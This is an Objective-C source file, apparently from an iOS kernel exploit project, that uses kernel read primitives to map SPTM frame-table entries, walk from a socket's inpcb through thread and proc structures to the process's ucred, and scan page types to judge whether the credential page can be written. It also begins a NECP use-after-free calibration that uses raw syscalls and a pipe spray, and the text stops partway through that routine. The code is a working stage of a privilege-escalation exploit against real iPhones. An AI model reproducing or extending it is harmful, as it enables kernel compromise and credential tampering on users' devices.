//
//  KPMapScope.m
//  KexProofV2
//
//  R5e: read-only scope recon. No kernel writes — kread only.
//

#import "KPMapScope.h"
#import "KPLog.h"
#import "KPDump.h"

#import <string.h>
#import <mach/mach.h>
#import <malloc/malloc.h>
#import <ImageIO/ImageIO.h>
#import <CoreGraphics/CoreGraphics.h>
#include <signal.h>
#include <setjmp.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>
// Use numeric constants — netinet/ip.h may not exist in iOS SDK
#ifndef IP_OPTIONS
#define IP_OPTIONS 4
#endif
#ifndef IPPROTO_IP
#define IPPROTO_IP 0
#endif
#ifndef IPPROTO_IPV6
#define IPPROTO_IPV6 41
#endif
#ifndef IPV6_HOPOPTS
#define IPV6_HOPOPTS 54
#endif

#import <libjailbreak/info.h>
#import <libjailbreak/primitives.h>
#import <libjailbreak/translation.h>

#import "exploit/kutils.h"
#import "exploit/kexploit_opa334.h"  // darksword_rw_socket_pcb()
#import "exploit/krw_zone_write.h"   // krw_zone_write_qword / krw_zone_verdict
#import "exploit/offsets.h"
#import "TaskRop/pac.h"   // off_proc_ro_pr_task / off_task_map

// ---------------------------------------------------------------------------
// Static VAs from kernelcache-18.6-iphone16 (unslid). Slide is applied at runtime.
// ---------------------------------------------------------------------------

// Page-mgmt flags (R5c/R5d)
#define STATIC_FLAG_PROMOTE_21  0xfffffff007aa258aULL   // bit0 = promote to 0x21
#define STATIC_FLAG_PAGEMGMT    0xfffffff007aa2a31ULL   // second page-mgmt flag

// kernel_pmap / kernel_map global (R5d: 116 uses in the pmap region)
#define STATIC_KERNEL_PMAP      0xfffffff00aad31c0ULL   // pmap object (or +0x1c0 of page)
#define STATIC_KERNEL_PMAP_PAGE 0xfffffff00aad3000ULL

// Object layout decoded from walker 0x80dd69c (R5d)
#define PMAP_OFF_NEXT       0x08
#define PMAP_OFF_HEAD       0x10   // list sentinel
#define PMAP_OFF_START      0x10   // node range start (same slot, node view)
#define PMAP_OFF_END        0x18   // node range end
#define PMAP_OFF_PACPTR     0x40   // PAC-signed ptr (autda discr 0x250c)
#define PMAP_OFF_NODEFLAGS  0x38
#define PMAP_OFF_NODEPA     0x40   // node: translated PA-ish
#define PMAP_OFF_TYPEBYTE   0x92   // obj+216 used as state byte in walker
#define PMAP_OFF_COUNTISH   0x70   // obj+112

// FTE
#define FTE_SIZE            16
#define FTE_OFF_TYPE        2
#define FTE_OFF_READREF     8
#define FTE_OFF_WEREF       12

// ---------------------------------------------------------------------------
// Local helpers (kpRead/kpNote are static in KPDump.m)
// ---------------------------------------------------------------------------

static void scopeNote(NSMutableString *r, NSString *line) {
    [r appendString:line];
    [r appendString:@"\n"];
    [[KPLog shared] append:line];
}

static BOOL scopeRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *r) {
    if (!gPrimitives.kreadbuf) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: KRW not live", what]);
        return NO;
    }
    if (!addr) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: null addr", what]);
        return NO;
    }
    if ((addr & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: not a kernel ptr 0x%016llx",
                      what, (unsigned long long)addr]);
        return NO;
    }
    // EL2 domain (SPTM/TXM images) panics on read — never touch.
    uint64_t sptmLo = kconstant(staticSptmBase);
    uint64_t txmLo  = kconstant(staticTxmBase);
    uint64_t slide  = kconstant(slide);
    if (sptmLo && addr >= sptmLo + slide && addr < sptmLo + slide + 0xF4000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 SPTM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    if (txmLo && addr >= txmLo + slide && addr < txmLo + slide + 0x64000) {
        scopeNote(r, [NSString stringWithFormat:@"  [skip] %s: EL2 TXM domain 0x%016llx", what, (unsigned long long)addr]);
        return NO;
    }
    // Unmapped-read gate (same reason as KPDump 1.7.3): a garbage pointee
    // inside the kernel-looking range but outside the image panics the
    // physical aperture. Skip reads whose endpoints do not resolve to a PA.
    // Kernel image itself is always mapped — don't gate those.
    uint64_t kb = kconstant(base);
    BOOL inKernelImage = kb && addr >= kb && addr + size <= kb + 0x5000000ULL;
    if (!inKernelImage) {
        uint64_t pa0 = kvtophys(addr);
        uint64_t pa1 = kvtophys(addr + size - 1);
        if (!pa0 || !pa1) {
            scopeNote(r, [NSString stringWithFormat:
                          @"  [skip] %s: unmapped VA 0x%016llx (kvtophys=0/0x%llx) — пропуск",
                          what, (unsigned long long)addr, (unsigned long long)pa0]);
            return NO;
        }
    }
    memset(out, 0, size);
    gPrimitives.kreadbuf(addr, out, size);
    return YES;
}

static uint64_t scopeUntag(uint64_t p) {
    return kp_untag_ptr(p);
}

static uint64_t scopeSlideVA(uint64_t staticVA) {
    // staticVA is unslid; runtime = staticVA + slide
    // slide = kconstant(base) - kconstant(staticBase)
    uint64_t slide = kconstant(slide);
    if (!slide && kconstant(base) && kconstant(staticBase)) {
        slide = kconstant(base) - kconstant(staticBase);
    }
    return staticVA + slide;
}

static const char *scopeTypeName(uint8_t t) {
    switch (t) {
        case 0x00: return "GOD/init";
        case 0x0b: return "XNU_GENERIC";
        case 0x15: return "PAGE_TABLE";
        case 0x18: return "ROZONE";
        case 0x1a: return "IOFILTER";
        case 0x21: return "XNU_DEFAULT";
        case 0x37: return "T8110_DART?";
        default:   return "?";
    }
}


// Gated read: kernel-shape + kvtophys proof both ends. Same reason as
// KPDump 1.7.3 — a raw kreadbuf into an unmapped kernel-looking hole panics.
static BOOL scopeGatedRead(uint64_t addr, void *out, size_t size, const char *what, NSMutableString *r) {
    if (!addr || !gPrimitives.kreadbuf) return NO;
    if ((addr & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) return NO;
    uint64_t kb = kconstant(base);
    BOOL inImage = kb && addr >= kb && addr + size <= kb + 0x5000000ULL;
    if (!inImage) {
        if (kvtophys(addr) == 0 || kvtophys(addr + size - 1) == 0) {
            scopeNote(r, [NSString stringWithFormat:@"  [gate] %s unmapped 0x%016llx", what, (unsigned long long)addr]);
            return NO;
        }
    }
    memset(out, 0, size);
    gPrimitives.kreadbuf(addr, out, size);
    return YES;
}

// ---------------------------------------------------------------------------
// The report — SAFE MODE
// Only reads bytes inside the kernel image (always mapped) + gSystemInfo
// values that the exploit already populated. NO pointer chasing, NO
// kvtophys/vtophys walks, NO proc/pmap entry walks. Reboot-class guard.
// ---------------------------------------------------------------------------

@implementation KPMapScope

+ (NSString *)kernelPmapScopeReport {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5e: scope recon (READ-ONLY, safe mode) ===\n"];

    if (!gPrimitives.kreadbuf) {
        scopeNote(r, @"KRW primitives not live — run the exploit first.");
        return r;
    }

    // ---- 1. Boot constants (no kernel reads — just gSystemInfo) ----
    scopeNote(r, [NSString stringWithFormat:@"kernel base (runtime) = 0x%016llx",
                  (unsigned long long)kconstant(base)]);
    scopeNote(r, [NSString stringWithFormat:@"kernel slide          = 0x%016llx",
                  (unsigned long long)kconstant(slide)]);
    scopeNote(r, [NSString stringWithFormat:@"staticBase            = 0x%016llx",
                  (unsigned long long)kconstant(staticBase)]);
    scopeNote(r, [NSString stringWithFormat:@"virtBase/physBase     = 0x%016llx / 0x%016llx",
                  (unsigned long long)kconstant(virtBase),
                  (unsigned long long)kconstant(physBase)]);
    scopeNote(r, [NSString stringWithFormat:@"physSize              = 0x%016llx",
                  (unsigned long long)kconstant(physSize)]);

    // ---- 2. Page-mgmt flags — inside kernel image, always mapped ----
    [r appendString:@"\n--- page-mgmt flags (kernel image) ---\n"];

    uint64_t slide = kconstant(slide);
    uint64_t kb = kconstant(base);

    struct { uint64_t st; const char *name; } flags[2];
    flags[0].st = 0xfffffff007aa258aULL;
    flags[0].name = "promote-0x21";
    flags[1].st = 0xfffffff007aa2a31ULL;
    flags[1].name = "pagemgmt-2";

    for (unsigned i = 0; i < 2; i++) {
        uint64_t va = flags[i].st + slide;
        if (kb && va >= kb && va < kb + 0x5000000ULL) {
            uint8_t b = 0;
            gPrimitives.kreadbuf(va, &b, 1);
            scopeNote(r, [NSString stringWithFormat:
                @"  %-14s @ 0x%016llx = 0x%02x  bit0=%d",
                flags[i].name, (unsigned long long)va, b, b & 1]);
            if (i == 0) {
                if (b & 1) {
                    scopeNote(r, @"  >> PROMOTE-TO-0x21 ENABLED (hop 2 gate is open)");
                } else {
                    scopeNote(r, @"  >> promote disabled (collapse to 0x0b)");
                }
            }
        } else {
            scopeNote(r, [NSString stringWithFormat:
                @"  %-14s @ 0x%016llx — outside kernel image, skip",
                flags[i].name, (unsigned long long)(flags[i].st + slide)]);
        }
    }

    // ---- 3. XPF symbol slots (addresses only — do NOT deref) ----
    [r appendString:@"\n--- XPF symbols (slot addrs only) ---\n"];
    scopeNote(r, [NSString stringWithFormat:@"  libsptm_frame_table        slot @ 0x%016llx",
                  (unsigned long long)ksymbol(libsptm_frame_table)]);
    scopeNote(r, [NSString stringWithFormat:@"  libsptm_frame_type_params  slot @ 0x%016llx",
                  (unsigned long long)ksymbol(libsptm_frame_type_params)]);
    scopeNote(r, [NSString stringWithFormat:@"  vm_page_array_begin        slot @ 0x%016llx",
                  (unsigned long long)ksymbol(vm_page_array_beginning_addr)]);
    scopeNote(r, [NSString stringWithFormat:@"  pv_head_table              slot @ 0x%016llx",
                  (unsigned long long)ksymbol(pv_head_table)]);
    scopeNote(r, [NSString stringWithFormat:@"  vm_map.pmap off = %u   pmap.ttep off = %u   entry.next off = %u",
                  (unsigned)koffsetof(vm_map, pmap),
                  (unsigned)koffsetof(pmap, ttep),
                  (unsigned)koffsetof(vm_map_entry, next)]);

    // ---- 4. ucred: diagnostic hop chain (inpcb -> socket -> thread -> proc) ----
    // proc_self() returns 0 with no visibility. Walk the same chain ourselves
    // with a kernel-shape check and a log line per hop. NO allproc walk,
    // NO zoneRoute. Each read is on a pointer just validated from the hop above.
    [r appendString:@"\n--- ucred: hop chain (rwSocketPcb) ---\n"];
    {
        uint64_t pcb = darksword_rw_socket_pcb();
        scopeNote(r, [NSString stringWithFormat:@"  rwSocketPcb = 0x%016llx",
                      (unsigned long long)pcb]);
        if (!pcb || ((pcb & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL)) {
            scopeNote(r, @"  rwSocketPcb пуст/мусор — эксплойт не выставил inpcb. Стоп.");
        } else {
            uint64_t h1 = 0, h2 = 0, h3 = 0, h4 = 0, raw = 0;
            // hop 1: inpcb -> socket
            gPrimitives.kreadbuf(pcb + off_inpcb_inp_socket, &raw, 8);
            h1 = kp_untag_ptr(raw);
            scopeNote(r, [NSString stringWithFormat:@"  hop1 inpcb.socket   = 0x%016llx  (raw 0x%016llx)",
                          (unsigned long long)h1, (unsigned long long)raw]);
            if ((h1 & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
                scopeNote(r, @"  hop1 не kernel ptr — стоп.");
            } else {
                // hop 2: socket -> background_thread
                raw = 0;
                gPrimitives.kreadbuf(h1 + off_socket_so_background_thread, &raw, 8);
                h2 = kp_untag_ptr(raw);
                scopeNote(r, [NSString stringWithFormat:@"  hop2 sock.bg_thread = 0x%016llx  (raw 0x%016llx)",
                              (unsigned long long)h2, (unsigned long long)raw]);
                if ((h2 & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
                    scopeNote(r, @"  hop2 bg_thread = 0 — this socket has no background thread.");
            // ---- Alternate: control socket ----
            {
                uint64_t cpcb = darksword_control_socket_pcb();
                scopeNote(r, [NSString stringWithFormat:@"  alt: controlSocketPcb = 0x%016llx",
                              (unsigned long long)cpcb]);
                if (cpcb && ((cpcb & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)) {
                    uint64_t craw = 0, csock = 0, cthr = 0;
                    gPrimitives.kreadbuf(cpcb + off_inpcb_inp_socket, &craw, 8);
                    csock = kp_untag_ptr(craw);
                    scopeNote(r, [NSString stringWithFormat:@"  alt: ctrl.socket = 0x%016llx",
                                  (unsigned long long)csock]);
                    if ((csock & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                        craw = 0;
                        gPrimitives.kreadbuf(csock + off_socket_so_background_thread, &craw, 8);
                        cthr = kp_untag_ptr(craw);
                        scopeNote(r, [NSString stringWithFormat:@"  alt: ctrl.bg_thread = 0x%016llx",
                                      (unsigned long long)cthr]);
                    }
                }
            }
            // ---- Alternate: our own mach thread port -> thread_t (TaskRop) ----
            {
                mach_port_t mt = mach_thread_self();
                uint64_t thrKVA = [KPDump rcResolveThreadKVA:mt];
                scopeNote(r, [NSString stringWithFormat:@"  alt: mach_thread_self port=%u -> thread_t = 0x%016llx",
                              (unsigned)mt, (unsigned long long)thrKVA]);
                if (thrKVA && ((thrKVA & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL)) {
                    uint64_t raw = 0, tro = 0, proc = 0;
                    gPrimitives.kreadbuf(thrKVA + off_thread_t_tro, &raw, 8);
                    tro = kp_untag_ptr(raw);
                    scopeNote(r, [NSString stringWithFormat:@"  alt: thread.tro = 0x%016llx",
                                  (unsigned long long)tro]);
                    if ((tro & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                        raw = 0;
                        gPrimitives.kreadbuf(tro + off_thread_ro_tro_proc, &raw, 8);
                        proc = kp_untag_ptr(raw);
                        scopeNote(r, [NSString stringWithFormat:@"  alt: tro.proc = 0x%016llx",
                                      (unsigned long long)proc]);
                    }
                    if ((proc & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                        uint64_t procRo = 0, ucred = 0, raw2 = 0;
                        gPrimitives.kreadbuf(proc + off_proc_p_proc_ro, &raw2, 8);
                        procRo = kp_untag_ptr(raw2);
                        scopeNote(r, [NSString stringWithFormat:@"  alt: p_proc_ro = 0x%016llx",
                                      (unsigned long long)procRo]);
                        if ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                            raw2 = 0;
                            gPrimitives.kreadbuf(procRo + off_proc_ro_p_ucred, &raw2, 8);
                            ucred = kp_untag_ptr(raw2);
                            scopeNote(r, [NSString stringWithFormat:@"  alt: p_ucred = 0x%016llx",
                                          (unsigned long long)ucred]);
                        }
                        if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                            uint64_t uid = 0;
                            gPrimitives.kreadbuf(ucred + 0x18, &uid, 8);
                            scopeNote(r, [NSString stringWithFormat:@"  alt: ucred+0x18 uid = 0x%016llx",
                                          (unsigned long long)uid]);
                        }
                    }
                }
                mach_port_deallocate(mach_task_self(), mt);
            }
            // ---- Alternate 3: SAFE allproc walk (gated reads, 128 nodes) ----
            // findProcByCommName uses raw kreadbuf per node = panic class.
            // This walk gates every read with kvtophys and stops hard on junk.
            {
                uint64_t sym = ksymbol(allproc);
                scopeNote(r, [NSString stringWithFormat:@"  alt3: allproc slot @ 0x%016llx",
                              (unsigned long long)sym]);
                uint64_t head = 0;
                if (sym && scopeGatedRead(sym, &head, 8, "allproc head", r)) {
                    head = kp_untag_ptr(head);
                    scopeNote(r, [NSString stringWithFormat:@"  alt3: allproc head = 0x%016llx",
                                  (unsigned long long)head]);
                    uint64_t node = head, prev = 0;
                    pid_t want = getpid();
                    for (int n = 0; n < 128; n++) {
                        if (!node || node == prev) break;
                        if ((node & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
                            scopeNote(r, [NSString stringWithFormat:@"  alt3: junk node @ %d", n]);
                            break;
                        }
                        uint32_t pid = 0;
                        uint64_t nextRaw = 0;
                        if (!scopeGatedRead(node + off_proc_p_pid, &pid, 4, "p_pid", r)) break;
                        if (pid == (uint32_t)want) {
                            scopeNote(r, [NSString stringWithFormat:
                                          @"  alt3: FOUND our proc @ 0x%016llx (pid=%d, nodes=%d)",
                                          (unsigned long long)node, (int)pid, n]);
                            uint64_t procRo = 0, ucred = 0, raw = 0;
                            if (scopeGatedRead(node + off_proc_p_proc_ro, &raw, 8, "p_proc_ro", r)) {
                                procRo = kp_untag_ptr(raw);
                                scopeNote(r, [NSString stringWithFormat:@"  alt3: p_proc_ro = 0x%016llx",
                                              (unsigned long long)procRo]);
                            }
                            if ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                raw = 0;
                                if (scopeGatedRead(procRo + off_proc_ro_p_ucred, &raw, 8, "p_ucred", r)) {
                                    ucred = kp_untag_ptr(raw);
                                    scopeNote(r, [NSString stringWithFormat:@"  alt3: p_ucred = 0x%016llx",
                                                  (unsigned long long)ucred]);
                                }
                            }
                            if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                uint64_t uid = 0;
                                if (scopeGatedRead(ucred + 0x18, &uid, 8, "uid", r)) {
                                    scopeNote(r, [NSString stringWithFormat:@"  alt3: ucred+0x18 = 0x%016llx",
                                                  (unsigned long long)uid]);
                                }
                            }
                            // ---- FTE oracle on ucred's page (R5c target) ----
                            if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                uint64_t ucPA = kvtophys(ucred);
                                scopeNote(r, [NSString stringWithFormat:@"  alt3: ucred PA = 0x%016llx",
                                              (unsigned long long)ucPA]);
                                uint64_t pB = kconstant(physBase);
                                uint64_t tableSlot = ksymbol(libsptm_frame_table);
                                uint64_t tableVA = 0, raw = 0;
                                if (tableSlot && scopeGatedRead(tableSlot, &raw, 8, "frame_table slot", r)) {
                                    tableVA = kp_untag_ptr(raw);
                                }
                                if (!tableVA && tableSlot) tableVA = tableSlot;
                                scopeNote(r, [NSString stringWithFormat:@"  alt3: frame_table = 0x%016llx",
                                              (unsigned long long)tableVA]);
                                if (tableVA && pB && ucPA >= pB) {
                                    uint64_t fteVA = tableVA + ((ucPA - pB) >> 14) * 16;
                                    scopeNote(r, [NSString stringWithFormat:@"  alt3: FTE VA = 0x%016llx (pfn=%llu)",
                                                  (unsigned long long)fteVA,
                                                  (unsigned long long)((ucPA - pB) >> 14)]);
                                    uint8_t fte[16];
                                    if (scopeGatedRead(fteVA, fte, 16, "FTE", r)) {
                                        scopeNote(r, [NSString stringWithFormat:
                                            @"  alt3: FTE raw %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x  %02x %02x %02x %02x",
                                            fte[0],fte[1],fte[2],fte[3],fte[4],fte[5],fte[6],fte[7],
                                            fte[8],fte[9],fte[10],fte[11],fte[12],fte[13],fte[14],fte[15]]);
                                        uint8_t ty = fte[2];
                                        const char *tn = "?";
                                        if (ty == 0x18) tn = "ROZONE";
                                        else if (ty == 0x21) tn = "XNU_DEFAULT";
                                        else if (ty == 0x0b) tn = "XNU_GENERIC";
                                        else if (ty == 0x1a) tn = "IOFILTER";
                                        else if (ty == 0x15) tn = "PAGE_TABLE";
                                        scopeNote(r, [NSString stringWithFormat:
                                            @"  alt3: FTE type = 0x%02x (%s)", ty, tn]);
                                        if (ty == 0x18) {
                                            scopeNote(r, @"  >> ucred page is ROZONE (0x18) — hop 1 target CONFIRMED.");
                                        } else if (ty == 0x21) {
                                            scopeNote(r, @"  >> ucred page is XNU_DEFAULT (0x21) — kwrite-ready!");
                                        } else if (ty == 0x0b) {
                                            scopeNote(r, @"  >> ucred page is XNU_GENERIC (0x0b) — hop 1 done.");
                                        }
                                    }

                                    // ---- R5f: FTE census — is +8 always 1 on ROZONE? ----
                                    scopeNote(r, @"  alt3: --- FTE census (compare +8/+12) ---");
                                    {
                                        uint64_t pfn = (ucPA - pB) >> 14;
                                        int64_t deltas[6] = { -3, -2, -1, 1, 2, 3 };
                                        for (int k = 0; k < 6; k++) {
                                            int64_t pfn2 = (int64_t)pfn + deltas[k];
                                            if (pfn2 < 0) continue;
                                            uint64_t pa2 = pB + ((uint64_t)pfn2 << 14);
                                            uint64_t fte2 = tableVA + ((uint64_t)pfn2) * 16;
                                            uint8_t e[16];
                                            if (scopeGatedRead(fte2, e, 16, "FTE neigh", r)) {
                                                uint32_t r8 = 0, r12 = 0;
                                                memcpy(&r8, e + 8, 4);
                                                memcpy(&r12, e + 12, 4);
                                                scopeNote(r, [NSString stringWithFormat:
                                                    @"  alt3: neigh pfn=%lld pa=0x%llx type=0x%02x +8=%u +12=%u  raw %02x%02x%02x%02x %02x%02x%02x%02x",
                                                    (long long)pfn2, (unsigned long long)pa2,
                                                    e[2], r8, r12,
                                                    e[0],e[1],e[2],e[3],e[4],e[5],e[6],e[7]]);
                                            }
                                        }
                                        // Also dump kernel-image page FTE for comparison
                                        uint64_t kb2 = kconstant(base);
                                        if (kb2) {
                                            uint64_t kpa = kvtophys(kb2);
                                            if (kpa >= pB) {
                                                uint64_t kpfn = (kpa - pB) >> 14;
                                                uint64_t fte3 = tableVA + kpfn * 16;
                                                uint8_t e[16];
                                                if (scopeGatedRead(fte3, e, 16, "FTE kernel-img", r)) {
                                                    uint32_t r8 = 0, r12 = 0;
                                                    memcpy(&r8, e + 8, 4);
                                                    memcpy(&r12, e + 12, 4);
                                                    scopeNote(r, [NSString stringWithFormat:
                                                        @"  alt3: kernel-img pfn=%llu type=0x%02x +8=%u +12=%u",
                                                        (unsigned long long)kpfn, e[2], r8, r12]);
                                                }
                                            }
                                        }
                                    }

                                    // ---- R5f2: sample other ROZONE (0x18) frames ----
                                    scopeNote(r, [NSString stringWithFormat:@"  alt3: --- ROZONE scan around pfn=%llu (±256) ---",
                                          (unsigned long long)((ucPA - pB) >> 14)]);
                                    {
                                        int seen = 0, ro_nonzero = 0;
                                        uint64_t ucPfn = (ucPA - pB) >> 14;
                                        int64_t lo = (int64_t)ucPfn - 256;
                                        if (lo < 0) lo = 0;
                                        int64_t hi = (int64_t)ucPfn + 256;
                                        for (int64_t k = lo; k <= hi && seen < 24; k++) {
                                            uint64_t pa2 = pB + ((uint64_t)k << 14);
                                            if (pa2 == ucPA) continue;
                                            uint64_t fte2 = tableVA + (uint64_t)k * 16;
                                            uint8_t e[16];
                                            if (!scopeGatedRead(fte2, e, 16, "FTE scan", r)) continue;
                                            if (e[2] != 0x18) continue;
                                            seen++;
                                            uint32_t r8 = 0, r12 = 0;
                                            memcpy(&r8, e + 8, 4);
                                            memcpy(&r12, e + 12, 4);
                                            if (r8) ro_nonzero++;
                                            scopeNote(r, [NSString stringWithFormat:
                                                @"  alt3: ROZONE pfn=%u pa=0x%llx ro_ref=%u wx_ref=%u",
                                                k, (unsigned long long)pa2, r8, r12]);
                                        }
                                        scopeNote(r, [NSString stringWithFormat:
                                            @"  alt3: ROZONE sampled=%d  ro_ref!=0 : %d / %d",
                                            seen, ro_nonzero, seen]);
                                        if (seen && ro_nonzero == 0) {
                                            scopeNote(r, @"  >> наша страница — исключение: кто-то держит именно её.");
                                        } else if (seen && ro_nonzero == seen) {
                                            scopeNote(r, @"  >> ro_ref=1 у всех ROZONE — структурное, не наш держатель.");
                                        }
                                    }

                                    // ---- R5f: frame_type_params[0x18] descriptor ----
                                    scopeNote(r, @"  alt3: --- frame_type_params[0x18] ---");
                                    {
                                        uint64_t pSlot = ksymbol(libsptm_frame_type_params);
                                        uint64_t pVA = 0, raw = 0;
                                        if (pSlot && scopeGatedRead(pSlot, &raw, 8, "params slot", r)) {
                                            pVA = kp_untag_ptr(raw);
                                        }
                                        if (!pVA && pSlot) pVA = pSlot;
                                        scopeNote(r, [NSString stringWithFormat:@"  alt3: params VA = 0x%016llx",
                                                      (unsigned long long)pVA]);
                                        if (pVA) {
                                            uint8_t d[0x60];
                                            if (scopeGatedRead(pVA + 0x18 * 0x60, d, 0x60, "params[0x18]", r)) {
                                                scopeNote(r, [NSString stringWithFormat:
                                                    @"  alt3: params[0x18] domain=%u class=%u flags=0x%02x%02x",
                                                    d[0], d[1], d[0x41], d[0x40]]);
                                                uint64_t allowed = 0;
                                                memcpy(&allowed, d + 0x20, 8);
                                                scopeNote(r, [NSString stringWithFormat:
                                                    @"  alt3: allowed_new = 0x%016llx  (bit0x0b=%d bit0x21=%d)",
                                                    (unsigned long long)allowed,
                                                    (int)((allowed >> 0x0b) & 1),
                                                    (int)((allowed >> 0x21) & 1)]);
                                            }
                                            // also params[0x0b] for comparison
                                            if (scopeGatedRead(pVA + 0x0b * 0x60, d, 0x60, "params[0x0b]", r)) {
                                                uint64_t allowed = 0;
                                                memcpy(&allowed, d + 0x20, 8);
                                                scopeNote(r, [NSString stringWithFormat:
                                                    @"  alt3: params[0x0b] domain=%u class=%u allowed_new=0x%016llx",
                                                    d[0], d[1], (unsigned long long)allowed]);
                                            }
                                        }
                                    }
                                }
                            }
                            break;
                        }
                        if (!scopeGatedRead(node, &nextRaw, 8, "p_list.next", r)) break;
                        prev = node;
                        node = kp_untag_ptr(nextRaw);
                    }
                }
            }
                } else {
                    // hop 3: thread -> thread_ro
                    raw = 0;
                    gPrimitives.kreadbuf(h2 + off_thread_t_tro, &raw, 8);
                    h3 = kp_untag_ptr(raw);
                    scopeNote(r, [NSString stringWithFormat:@"  hop3 thread.tro     = 0x%016llx  (raw 0x%016llx)",
                                  (unsigned long long)h3, (unsigned long long)raw]);
                    if ((h3 & 0xFFFFFF0000000000ULL) != 0xFFFFFF0000000000ULL) {
                        scopeNote(r, @"  hop3 не kernel ptr — стоп.");
                    } else {
                        // hop 4: thread_ro -> proc
                        raw = 0;
                        gPrimitives.kreadbuf(h3 + off_thread_ro_tro_proc, &raw, 8);
                        h4 = kp_untag_ptr(raw);
                        scopeNote(r, [NSString stringWithFormat:@"  hop4 tro.proc       = 0x%016llx  (raw 0x%016llx)",
                                      (unsigned long long)h4, (unsigned long long)raw]);
                        if ((h4 & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                            // ucred via proc_ro
                            uint64_t procRo = 0, ucred = 0;
                            raw = 0;
                            gPrimitives.kreadbuf(h4 + off_proc_p_proc_ro, &raw, 8);
                            procRo = kp_untag_ptr(raw);
                            scopeNote(r, [NSString stringWithFormat:@"  p_proc_ro           = 0x%016llx",
                                          (unsigned long long)procRo]);
                            if ((procRo & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                raw = 0;
                                gPrimitives.kreadbuf(procRo + off_proc_ro_p_ucred, &raw, 8);
                                ucred = kp_untag_ptr(raw);
                                scopeNote(r, [NSString stringWithFormat:@"  p_ucred             = 0x%016llx",
                                              (unsigned long long)ucred]);
                            }
                            if ((ucred & 0xFFFFFF0000000000ULL) == 0xFFFFFF0000000000ULL) {
                                uint64_t uid = 0;
                                gPrimitives.kreadbuf(ucred + 0x18, &uid, 8);
                                scopeNote(r, [NSString stringWithFormat:@"  ucred+0x18 uid      = 0x%016llx",
                                              (unsigned long long)uid]);
                            }
                        } else {
                            scopeNote(r, @"  hop4 не kernel ptr — стоп.");
                        }
                    }
                }
            }
        }
    }

    // ---- 5. Verdict ----
    [r appendString:@"\n--- verdict (safe+ucred) ---\n"];
    scopeNote(r, @"  hop-chain diagnostic (rwSocketPcb). NO allproc, NO zoneRoute, NO walk, NO vtophys.");
    scopeNote(r, @"  Deep recon (ucred FTE + vm_map_entry walk) is deferred until");
    scopeNote(r, @"  the panic source is isolated. Flags above are the R5c result.");
    scopeNote(r, @"  (No kernel writes performed.)");

    return r;
}


// ---------------------------------------------------------------------------
// R5g: NECP UAF layout calibration — 3 snapshots of the flow slot.
//   1) before remove  2) after remove (pre-spray)  3) after pipe spray
// Answers definitively: does the spray hit the flow? which size class?
// Then scans the flow for the result-buffer pointer copy_result follows.
// ---------------------------------------------------------------------------

#define KPNC_OPEN        501
#define KPNC_ACTION      502
#define KPNC_ADD_CLIENT  0x01
#define KPNC_COPY_RESULT 0x04
#define KPNC_ADD_FLOW    0x11
#define KPNC_REMOVE_FLOW 0x12
#define KPNC_GATE_BYTE   9
#define KPNC_BUF_SZ      0x800

static long kpncAction(int fd, int action, void *u, uint32_t ul, void *d, uint32_t dl) {
    return syscall(KPNC_ACTION, fd, action, u, ul, d, dl);
}

typedef struct __attribute__((packed)) {
    uint8_t  out_uuid[16];
    uint8_t  in_uuid[16];
    uint16_t flags;
    uint16_t nexus_count;
    uint32_t pad;
} kpnc_flow_req_t;

static int kpncAddFlow(int fd, const uint8_t *client, uint8_t *flowOut) {
    kpnc_flow_req_t req;
    memset(&req, 0, sizeof(req));
    memcpy(req.in_uuid, client, 16);
    req.flags = 0x0040;
    req.nexus_count = 0;
    long rc = kpncAction(fd, KPNC_ADD_FLOW, (void *)client, 16, &req, sizeof(req));
    if (rc != 0) return -1;
    memcpy(flowOut, req.out_uuid, 16);
    int allz = 1;
    for (int j = 0; j < 16; j++) if (flowOut[j]) { allz = 0; break; }
    if (allz) memcpy(flowOut, req.in_uuid, 16);
    return 0;
}

static int kpncRemoveFlow(int fd, const uint8_t *flow) {
    return (int)kpncAction(fd, KPNC_REMOVE_FLOW, (void *)flow, 16, NULL, 0);
}

+ (NSString *)necpCalibReport {
    NSMutableString *r = [NSMutableString string];
    [r appendString:@"\n=== R5g: NECP UAF layout calibration (READ-ONLY dumps) ===\n"];

    if (!gPrimitives.kreadbuf) {
        scopeNote(r, @"KRW not live — run the exploit first.");
        return r;
    }

    errno = 0;
    int fd = (int)syscall(KPNC_OPEN, 0);
    if (fd < 0) {
        scopeNote(r, [NSString stringWithFormat:@"  necp_open FAIL errno=%d", errno]);
        return r;
    }
    uint8_t cuuid[16] = {0};
    uint8_t params[1] = {0};
    long rc = kpncAction(fd, KPNC_ADD_CLIENT, cuuid, 16, params, 1);
    if (rc != 0) {
        scopeNote(r, [NSString stringWithFormat:@"  add_client FAIL rc=%ld", rc]);
        close(fd);
        return r;
    }
